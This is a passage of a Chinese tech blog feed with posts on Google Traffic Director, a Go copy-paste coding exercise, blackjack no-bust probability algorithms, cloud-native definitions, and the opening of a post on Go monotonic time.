<h2 id="Traffic-Director-的主要功能"><a href="#Traffic-Director-的主要功能" class="headerlink" title="Traffic Director 的主要功能"></a>Traffic Director 的主要功能</h2><ul>
<li><p>全局负载均衡</p>
</li>
<li><p>中心化健康检查</p>
</li>
<li><p>基于Load的自动扩缩容</p>
</li>
<li><p>内嵌的弹性（高可用）</p>
</li>
<li><p>强大的流量控制能力</p>
</li>
</ul>
<p>从功能上，我的一篇翻译来的博客 <a href="http://zablog.me/2019/05/16/2019-05-16/">GCP网络深度解析：Traffic Director 如何提供全局负载均衡</a> 已经讲述地比较清楚了；</p>
<p>原理和意义上，敖老师的<a href="https://skyao.io/post/201905-google-traffic-director-detail/" target="_blank" rel="noopener">《Google Traffic Director 详细介绍》</a> 讲的也非常清晰，因此这里不会讲得特别详细，只会针对一些功能与使用的重点。</p>
<h2 id="Traffic-Director-的支持场景"><a href="#Traffic-Director-的支持场景" class="headerlink" title="Traffic Director 的支持场景"></a>Traffic Director 的支持场景</h2><p>从支持来看，Traffic Director目前支持 VM + Pod，这还是令人欣慰的。</p>
<p>你可以在 GCE（Google Compute Engine）和 GKE（Google Kubernetes Engine）上使用。不过从官方的指南来看，Traffic Director只支持自家产品，这是源于Traffic Director在生效的时候会操纵一些Google的API，因而不能直接支持其他的公有云或者私有云。</p>
<p>无论如何，VM+Pod的模式也是顺应了混合云的趋势，控制面不应该和云原生进行太强的绑定，还是要考虑到很多的服务仍有可能部署在虚拟机之中，这也是所有想要把Service Mesh落地的人需要重点考虑的问题。</p>
<h2 id="Traffic-Director-的实际体验"><a href="#Traffic-Director-的实际体验" class="headerlink" title="Traffic Director 的实际体验"></a>Traffic Director 的实际体验</h2><p>部署</p>
<p>首先建立一个GKE集群。云原生的集群，使用Traffic Director 应该比VM要更方便一点。</p>
<p>启动样例service，这个时候需要注意的是Traffic Director 只支持手动注入。也就是需要手动修改 kubectl -f 后面的 yaml 文件，让 container 把 Envoy 的容器也加载进同一个Pod内部。未来有可能会支持自动注入。</p>
<p>和其他的教程一样，这些指导性的操作都可以使用 Console 和 Gcloud 分别配置。即同时支持控制台图形界面操作和命令行操作的能力。（其实背后的API是一致的）</p>
<p>部署的体验总体还算容易，不过对于用户来说，需要比较多的GCP操控经验。否则面对很多GCP的概念还是一头雾水。</p>
<p>服务配置</p>
<p>Beta版本的配置能力非常地弱。</p>
<p>事实上，在Beta版本的Traffic Director配置页面中，只有两个Tab，分别是“服务”和“规则”。</p>
<p>什么是服务，理论上 VM/Pod + xDS API = 服务</p>
<p>只要你的VM或者Pod注入了Proxy，拥有了xDS API的能力，就算是一个服务了。当然配置服务的时候可以选择一些额外的配置，譬如端口号、平衡模式、健康检查等等。</p>
<p><img src="/images/traffic_director/svc.png" alt=""></p>
<p>服务配置<br>平衡模式的涵义就是流量速率控制，可以选择RPS（Request Per Second）的阈值，也可以选择CPU的比例。当RPC达到阈值，或者CPU达到比例之后，Traffic Director就不会把流量打过来，而是选择最为临近的可用的其他节点。</p>
<p>因为Traffic Director只能用来导引HTTP的服务，因此健康检查也相对容易一些。一般地，只需要每隔5秒检查一下端口可用性即可。连续两次发现端口不可用，即认为服务不健康。</p>
<p>规则配置</p>
<p>绝大对数流量配置能力还在Alpha阶段，需要单独申请才能试用。</p>
<p>Beta版本下只有一些基础功能，配置界面如下：</p>
<p>路由规则配置<br>首先，你需要制定一个转发规则，决定目标；</p>
<p>然后你再确定一下主机和路径规则。可以使用主机（Host）、路径（Path）、服务（Service）进行匹配，匹配能力和转发能力都非常差。</p>
<p><img src="/images/traffic_director/rule.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Traffic Director 目前还处于测试状态，功能也不全，距离落地仍然很远。对于一个线上应用来说，进行Traffic Director的迁移肯定是得不偿失的。</p>
<p>在官网文档中，作者描述了很多局限性，包括：不支持Istio API、只支持HTTP流量、流量控制还在Alpha测试阶段、暂时与GCP强绑定等等。几乎每个局限性都是生产环境落地的死门。</p>
<p>但无论如何，使用数据面的开放接口并提供一个高可用的托管控制面的思路是非常明确的。在未来的计划中，Traffic Director将会对Istio的功能有更好的支持，提供更强大的流量控制与可观测能力，带来更强的稳定性和灵活性，所以Traffic Director的未来依然值得期待。</p>
<p>相关参考：</p>
<ul>
<li><p>《Traffic Director官网文档》<a href="https://cloud.google.com/traffic-director/docs/traffic-director-concepts" target="_blank" rel="noopener">https://cloud.google.com/traffic-director/docs/traffic-director-concepts</a></p>
</li>
<li><p>《GCP网络深度解析：Traffic Director 如何提供全局负载均衡》 <a href="http://zablog.me/2019/05/16/2019-05-16/">http://zablog.me/2019/05/16/2019-05-16/</a> </p>
</li>
<li><p>《Google Traffic Director 详细介绍》 <a href="https://skyao.io/post/201905-google-traffic-director-detail/" target="_blank" rel="noopener">https://skyao.io/post/201905-google-traffic-director-detail/</a></p>
</li>
<li><p>《Google Cloud networking in depth: How Traffic Director provides global load balancing for open service mesh》<a href="https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh" target="_blank" rel="noopener">https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh</a></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Traffic Director是由谷歌云平台（Google Cloud Platform）推出的服务网格（Service Mesh）流量控制面（Control Plane）。&lt;/p&gt;
&lt;p&gt;Traffic Director可以应用于虚拟机（Virtual Machine），也可以应用于基于Kubernetes管理的容器，它使用Envoy开源的xDS v2 API接口来与数据面的服务代理进行交互。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>谷歌云网络深度解析：流量指挥官如何为服务网格提供全局负载均衡</title>
    <link href="http://zablog.me/2019/05/16/2019-05-16/"/>
    <id>http://zablog.me/2019/05/16/2019-05-16/</id>
    <published>2019-05-16T10:20:00.000Z</published>
    <updated>2019-05-16T10:50:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh" target="_blank" rel="noopener">https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh</a><br>作者：Anna Berenberg &amp; Arunkumar Jayaraman April 18, 2019</p>
<p>服务网格为不同队伍用不同语言开发的独立微服务提供了基础。服务网格将开发和运维进行解耦，开发者再也不用在应用代码中维护一套网络路由规则了。所有的流量路由规则都被<a href="http://envoyproxy.io/" target="_blank" rel="noopener">Envoy</a>等服务代理所接管，由服务网格<strong>控制面</strong>提供动态的流量管控。</p>
<a id="more"></a>
<p><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Traffic_Director_for_service_mesh.max-1200x1200.png" alt=""></p>
<blockquote>
<p>流量指挥官让服务网格和Envoy更容易在生产环境中使用。 —— Matt Klein, Envoy的创始人</p>
</blockquote>
<p>流量指挥官是谷歌云全方位管控的服务网格流量控制面。流量指挥官对于虚拟机和容器都有效，它使用开源的<code>xDS</code>接口来与数据面的服务代理进行交互。</p>
<h2 id="流量指挥官的能力"><a href="#流量指挥官的能力" class="headerlink" title="流量指挥官的能力"></a>流量指挥官的能力</h2><ol>
<li>全局负载均衡</li>
<li>中心化健康检查</li>
<li>基于Load的自动扩缩容</li>
<li>内嵌的弹性（高可用）</li>
<li>强大的流量控制能力</li>
</ol>
<h3 id="全局负载均衡"><a href="#全局负载均衡" class="headerlink" title="全局负载均衡"></a>全局负载均衡</h3><p>你们很多人肯定都使用过谷歌面向互联网服务的全局负载均衡。流量指挥官把全局负载均衡带到了服务网格的微服务场景下。通过全局负载均衡，我们可以为你在GCP上全球部署的服务实例赋能。流量指挥官提供了一套智能的通信方案，是的客户端自动把流量发往容量有空余的最近服务节点。<br>这可以大大优化服务上下游之间的流量分布，为请求提供最短的<a href="https://en.wikipedia.org/wiki/Round-trip_delay_time" target="_blank" rel="noopener">RTT</a>时间。</p>
<p><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Global_load_balancing.max-1400x1400.png" alt="全局负载均衡"></p>
<p>如果距离客户端最近的服务节点挂掉了，那么流量指挥官会智能无缝地把流量切换到最近的健康节点。</p>
<p><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Traffic_Director_intelligence.max-1400x1400.png" alt="切换到最近的健康节点"></p>
<h3 id="中心化健康监测"><a href="#中心化健康监测" class="headerlink" title="中心化健康监测"></a>中心化健康监测</h3><p>大规模部署的服务网格会产生大量的健康检查的流量，因为每一个代理都要去检查下游的所有服务的健康状态。当服务网格的体量增长的时候，健康检查就称为了一个 n<sup>2</sup> 的问题（假设 client 的数量和 server 的数量级都是n）。这会成为服务伸缩的一个重大障碍。</p>
<p>流量指挥官通过中心化的服务健康检查解决了这个问题。它使用一个全局分布式的弹性系统监控器去监控所有的服务实例。接下来，流量指挥官使用<code>EDS API</code>，把健康检查的结果分发到全球所有的代理。</p>
<h3 id="基于Load的自动扩缩容"><a href="#基于Load的自动扩缩容" class="headerlink" title="基于Load的自动扩缩容"></a>基于Load的自动扩缩容</h3><p>流量指挥官可以基于Load，支持自动扩容和缩容。Load信号是由proxy上报给它的。流量指挥官通知计算引擎扩/缩容到具体的大小。</p>
<p>当计算引擎扩容成功之前，流量指挥官会临时把流量打到其他可用的实例上，如果需要的话甚至会把流量临时打到其他的区域。一旦自动扩容成功，流量指挥官会把流量重新定位到最近的区域上。</p>
<h3 id="内嵌弹性（高可用）"><a href="#内嵌弹性（高可用）" class="headerlink" title="内嵌弹性（高可用）"></a>内嵌弹性（高可用）</h3><p>流量指挥官是全面部署在GCP上的，你不用担心它的启动时间、生命周期管理、扩缩容、可用性等任何问题。流量指挥官的架构是全球分部署弹性部署的，它与Google自身的2C业务使用同样的系统。<br>流量指挥官可以提供 99.99% GA（Generally Available） 的 SLA（Service Level Aggreement）。</p>
<h3 id="流量控制能力"><a href="#流量控制能力" class="headerlink" title="流量控制能力"></a>流量控制能力</h3><p>流量指挥官让你可以在不修改应用代码的情况下控制流量<br>你可以创建一个自定义的流量控制规则或者策略</p>
<ul>
<li>HTTP匹配：指定参数，包括host，path以及header</li>
<li>HTTP行为：在匹配成功之后，指定需要进行的行为，包括重定向、重写、header变换、镜像、故障注入等等</li>
<li>每个服务的流量策略：可以设置负载均衡算法、熔断参数等其他服务级别的配置</li>
<li>配置过滤：把配置推送到客户端的部分子集的能力</li>
</ul>
<p>使用上述路由规则和流量策略，你可以轻松地使得流量控制能力足够强大。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文：&lt;a href=&quot;https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://cloud.google.com/blog/products/networking/traffic-director-global-traffic-management-for-open-service-mesh&lt;/a&gt;&lt;br&gt;作者：Anna Berenberg &amp;amp; Arunkumar Jayaraman April 18, 2019&lt;/p&gt;
&lt;p&gt;服务网格为不同队伍用不同语言开发的独立微服务提供了基础。服务网格将开发和运维进行解耦，开发者再也不用在应用代码中维护一套网络路由规则了。所有的流量路由规则都被&lt;a href=&quot;http://envoyproxy.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Envoy&lt;/a&gt;等服务代理所接管，由服务网格&lt;strong&gt;控制面&lt;/strong&gt;提供动态的流量管控。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>coding练习：键盘侠</title>
    <link href="http://zablog.me/2019/03/30/q02/"/>
    <id>http://zablog.me/2019/03/30/q02/</id>
    <published>2019-03-30T13:00:00.000Z</published>
    <updated>2019-05-16T10:22:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>网络喷子键盘侠的输入框上已经键入了一句喷人的话，现在他的键盘上只有两个键可用<br>C：拷贝，可以把输入框的所有内容拷贝下来<br>P：粘贴，可以在输入框结尾处添加刚刚拷贝的所有内容<br>请问他至少需要按多少次，可以把输入框里的话复制N次发送出去呢？</p>
<a id="more"></a>
<h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>如果不可能，则返回{-1, “”}。<br>我们保证 N &gt;= 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">N = 0</div><div class="line">做不到，返回 -1, &quot;&quot;</div><div class="line"></div><div class="line">N = 1</div><div class="line">0次：</div><div class="line"></div><div class="line">N = 2</div><div class="line">2次：CP</div><div class="line"></div><div class="line">N = 12</div><div class="line">7次：CPCPCPP</div></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有的同学可能会误以为这是一个动态规划的题目，<br>可能是因为有一道题叫做“矩阵乘法”，这个题目相比来说很类似。</p>
<p>实际上因为它可以完全用贪心法，所以没有必要动态规划。</p>
<p>直接采用因式分解，然后把因子加起来就可以了。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// KeyPress accepts target number of repeat times on the screen,</span></div><div class="line"><span class="comment">// 	returns times of key pressing &amp; key pressing sequence</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">KeyPress</span><span class="params">(N <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> seq <span class="keyword">string</span></div><div class="line">	<span class="keyword">if</span> N &lt;= <span class="number">0</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>, seq</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">var</span> result = <span class="number">0</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">2</span>; i &lt;= N; &#123;</div><div class="line">		<span class="keyword">if</span> N%i == <span class="number">0</span> &#123;</div><div class="line">			N = N / i</div><div class="line">			result += i</div><div class="line">			seq = seq + <span class="string">"C"</span></div><div class="line">			<span class="keyword">for</span> j := <span class="number">1</span>; j &lt; i; j++ &#123;</div><div class="line">				seq = seq + <span class="string">"P"</span></div><div class="line">			&#125;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			i++</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result, seq</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网络喷子键盘侠的输入框上已经键入了一句喷人的话，现在他的键盘上只有两个键可用&lt;br&gt;C：拷贝，可以把输入框的所有内容拷贝下来&lt;br&gt;P：粘贴，可以在输入框结尾处添加刚刚拷贝的所有内容&lt;br&gt;请问他至少需要按多少次，可以把输入框里的话复制N次发送出去呢？&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>计算21点在摸五张的情况下不爆牌的概率</title>
    <link href="http://zablog.me/2018/12/30/q01/"/>
    <id>http://zablog.me/2018/12/30/q01/</id>
    <published>2018-12-30T13:00:00.000Z</published>
    <updated>2018-12-30T13:39:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>21点游戏，在摸五张牌的情况下，不爆牌的概率。/ Calculating the probability of no burst while fetching 5 cards in blackjack.</p>
<a id="more"></a>
<h2 id="详细-Details"><a href="#详细-Details" class="headerlink" title="详细 / Details"></a>详细 / Details</h2><p>21点游戏，英文：Blackjack，是使用扑克牌玩的赌博游戏。</p>
<p>A可作1点或11点，2-10作该牌之点数，J、Q、K作10点。</p>
<p>玩家初始手上有2张牌。</p>
<p>如果玩家要牌后，其手上拥有的牌的总点数超过21点，便要揭开手上所拥有的牌，称为爆牌。</p>
<p>反之若其手上拥有的牌的总点数不超过21点，该玩家可决定是否继续要牌。</p>
<p>假设一个玩家为了完成某项挑战，一定会选择要牌三次，那么对于一局游戏来说，他要牌三次仍未爆牌的概率是多少？</p>
<h2 id="背景-Background"><a href="#背景-Background" class="headerlink" title="背景 / Background"></a>背景 / Background</h2><p>最近在玩R星开发的《荒野大镖客2》游戏，遇到了一个“赌徒系列挑战”之8：</p>
<p><img src="https://github.com/pkumza/coding/blob/master/q01/images/q01_01.jpeg?raw=true" alt="赌徒8"></p>
<p>当时耗费了2个小时不停地玩21点，终于完成了这个挑战。</p>
<p>这个挑战在网上被吐槽不少，只要在搜索引擎搜索“赌徒8”，全都是喷这个挑战的。大家都认为这个挑战的运气成分太大，而且完成这个挑战非常困难。</p>
<p>我突发奇想，想计算一下要牌3次还不爆牌的概率。（要牌3次就是有5张手牌）发现这是一个很好的概率题。</p>
<p>当然，对于真正的赌徒8挑战来说，想要算出完成赌徒8需要的期望局数，并不是3/不爆牌的概率。题目对于真正的游戏有一些简化。（尝试抽出最挑战大脑的部分，忽略其他细节，细节写在下面了。）</p>
<blockquote>
<p>首先，不爆牌并不意味着能赢过庄家，庄家仍有可能比你的5张牌更接近21点；<br>其次，这个游戏没有办法在已经达到21点的时候继续要牌。譬如你起手牌为 <code>A</code>和<code>K</code>，那么游戏会自动让你停牌，虽然这个时候你仍有可能摸5张牌而不爆，但是游戏机制决定你在这种情况下没办法继续摸牌了。 </p>
</blockquote>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一共有52张牌。A,2,3,4,5,6,7,8,9,10,J,Q,K各四张。<br>因为题目要求是不爆牌，所以A看做11点是没有意义的，直接把A当做1点即可。</p>
<p>52张牌中任意选5张，一共有C(52,5)种可能，即2598960种。<br>剩下的只需要枚举出所有的不爆牌的情形即可。</p>
<h2 id="Solution01"><a href="#Solution01" class="headerlink" title="Solution01"></a>Solution01</h2><p>使用模拟的方法，模拟1000000次情形，并统计不爆牌的次数，得出一个近似概率。</p>
<p>不是特别准确，但是也可以当做一个近似值。但是要真正较真的话，这是一个错误的解法。</p>
<p>实测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ go run ./s01/main.go</div><div class="line">Result is 0.053647</div><div class="line">Time consumed 505.888256ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution02"><a href="#Solution02" class="headerlink" title="Solution02"></a>Solution02</h2><p>暴力枚举</p>
<p>通过迭代的方式，枚举出每一种方法，并计算出总的不爆牌的方法数目，最终除以总方法数，得到概率值。<br>该方法的核心点在于模拟。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(M^N)</code> 指数级别，复杂度与阈值无关。</p>
<p><strong>空间复杂度</strong></p>
<p>很少，使用函数迭代，还有一个记录扑克的数组，勉强算是消耗 <code>O(M+N)</code> 的空间而已，</p>
<p><strong>实测</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s02/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 7.98652ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution03"><a href="#Solution03" class="headerlink" title="Solution03"></a>Solution03</h2><p>状态保留</p>
<p>我们调用<code>numOfPossibleCases</code>函数的时候发现，很多参数一模一样的被调用了很多次。<br>我们建立一个HashMap保存一下状态，当遇到已经吊用过的函数时候，直接返回即可，不需要再次计算。<br>达到免除重复计算的剪枝效果。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(N*T*M^2)</code> 将指数级别的复杂度降到了多项式级别。</p>
<p><strong>空间复杂度</strong></p>
<p>需要用一个 <code>HashMap</code> 来暂存状态</p>
<p>复杂度为<code>O(N*T*M)</code></p>
<p>实测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s03/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 1.408398ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution04"><a href="#Solution04" class="headerlink" title="Solution04"></a>Solution04</h2><p>动态规划</p>
<p>var dp [maxCardsToPick + 1][maxThreshold + 1][maxStart + 1]int</p>
<p>dp[i][j][k]的含义为：摸i张牌，最大不超过j，从第k张开始到最后一张牌是可选的范围，那么有几种摸牌的可能性。</p>
<p>状态转移方程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dp[i][j][k] = ∑ (l from k to totalNum) dp[i-1][j-pokers[l]][l+1]</div></pre></td></tr></table></figure>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(N*T*M^2)</code> 将指数级别的复杂度降到了多项式级别。</p>
<p><strong>空间复杂度</strong></p>
<p>建立了一个三维数组 var dp [maxCardsToPick + 1][maxThreshold + 1][maxStart + 1]int<br>复杂度为<code>O(N*T*M)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s04/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 474.663µs</div></pre></td></tr></table></figure>
<h2 id="Solution05"><a href="#Solution05" class="headerlink" title="Solution05"></a>Solution05</h2><p>优化空间复杂度的动态规划</p>
<p>因为三维数组的每一层只和前面一层有关系，因此可以通过翻转的方式，减少内存消耗。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p>和 Solution04 一致</p>
<p><strong>空间复杂度</strong></p>
<p>建立了一个三维数组 var dp [2][maxThreshold + 1][maxStart + 1]int<br>复杂度为<code>O(T*M)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s05/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 402.794µs</div></pre></td></tr></table></figure>
<hr>
<p>代码库位置 <a href="https://github.com/pkumza/coding/tree/master/q01" target="_blank" rel="noopener">https://github.com/pkumza/coding/tree/master/q01</a></p>
<p>附：测试环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">MacBook Pro</div><div class="line">macOS Mojave 10.14.2</div><div class="line">2.4 GHz Intel Core i7</div><div class="line">16 GB 1867 MHz LPDDR3</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;21点游戏，在摸五张牌的情况下，不爆牌的概率。/ Calculating the probability of no burst while fetching 5 cards in blackjack.&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>云原生的定义</title>
    <link href="http://zablog.me/2018/12/23/CloudNative/"/>
    <id>http://zablog.me/2018/12/23/CloudNative/</id>
    <published>2018-12-23T13:00:00.000Z</published>
    <updated>2018-12-23T06:19:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>云原生是一个比较新的概念。<br>Pivotal 是相关领域的先行者。<br><a href="https://www.cncf.io/" target="_blank" rel="noopener">CNCF</a>是一个2015年成立的基金会。<br>他们都对云原生有着自己的定义</p>
<a id="more"></a>
<h1 id="Pivotal"><a href="#Pivotal" class="headerlink" title="Pivotal"></a>Pivotal</h1><p>Pivotal 最早给出了相关的定义。</p>
<blockquote>
<p>Cloud-native is an approach to building and running applications that exploits the advantages of the cloud computing delivery model. Cloud-native is about how applications are created and deployed, not where.<br>While today public cloud impacts the thinking about infrastructure investment for virtually every industry, a cloud-like delivery model isn’t exclusive to public environments. It’s appropriate for both public and private clouds. Most important is the ability to offer nearly limitless computing power, on-demand, along with modern data and application services for developers. When companies build and operate applications in a cloud-native fashion, they bring new ideas to market faster and respond sooner to customer demands.</p>
<p>Organizations require a platform for building and operating cloud-native applications and services that automates and integrates the concepts of DevOps, continuous delivery, microservices, and containers:</p>
</blockquote>
<p>云原生是一种利用云计算交付模型的优势，来构建和运行应用程序的方法。<br>云原生的关注点在于应用程序如何创建和部署，而不关注在哪里部署。<br>虽然今天的公共云影响了几乎每个行业的基础设施投资思想，但类似云的交付模式并不仅限于公共环境。<br>它适用于公共云和私有云。<br>云原生应当始终是架构团队的追求目标。<br>当我们能够为业务团队按需提供充沛的计算能力，现代化的数据库和应用程序服务，那么业务团队也就能够更快地把新想法推向市场，并更快地响应客户请求。</p>
<p>组织需要一个平台来构建和运行云原生应用程序和服务，以自动化和集成DevOps，持续交付，微服务和容器的概念：</p>
<h1 id="CNCF"><a href="#CNCF" class="headerlink" title="CNCF"></a>CNCF</h1><p>云原生计算基金会（Cloud Native Computing Foundation）给出了另一个定义。</p>
<blockquote>
<p>Cloud native technologies empower organizations to build and run scalable applications in modern, dynamic environments such as public, private, and hybrid clouds. Containers, service meshes, microservices, immutable infrastructure, and declarative APIs exemplify this approach.</p>
<p>These techniques enable loosely coupled systems that are resilient, manageable, and observable. Combined with robust automation, they allow engineers to make high-impact changes frequently and predictably with minimal toil.</p>
<p>The Cloud Native Computing Foundation seeks to drive adoption of this paradigm by fostering and sustaining an ecosystem of open source, vendor-neutral projects. We democratize state-of-the-art patterns to make these innovations accessible for everyone.</p>
<p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。</p>
<p>云原生的代表技术包括<code>容器</code>、<code>服务网格</code>、<code>微服务</code>、<code>不可变基础设施</code>和<code>声明式API</code>。</p>
<p>这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。</p>
<p>云原生计算基金会（CNCF）致力于培育和维护一个厂商中立的开源生态系统，来推广云原生技术。我们通过将最前沿的模式民主化，让这些创新为大众所用。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1></blockquote>
<ul>
<li><a href="https://github.com/cncf/toc/blob/master/DEFINITION.md" target="_blank" rel="noopener">https://github.com/cncf/toc/blob/master/DEFINITION.md</a></li>
<li><a href="https://pivotal.io/cloud-native" target="_blank" rel="noopener">https://pivotal.io/cloud-native</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;云原生是一个比较新的概念。&lt;br&gt;Pivotal 是相关领域的先行者。&lt;br&gt;&lt;a href=&quot;https://www.cncf.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CNCF&lt;/a&gt;是一个2015年成立的基金会。&lt;br&gt;他们都对云原生有着自己的定义&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Monotonic time</title>
    <link href="http://zablog.me/2018/11/29/Monotonic/"/>
    <id>http://zablog.me/2018/11/29/Monotonic/</id>
    <published>2018-11-29T13:00:00.000Z</published>
    <updated>2018-11-29T06:14:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>go 1.9 之后，给Time增加了 Monotonic 部分。</p>
<a id="more"></a>
<p>系统提供了wall time 和 monotonic 时间。<br>其中wall time会根据时间校准而改变，而monotonic不会。</p>
<p>举个例子。<br>你写了一个日志收集程序，每10秒把收到的日志汇报给流式收集系统。<br>但是你的机器事件比真实时间快了1分钟。</p>
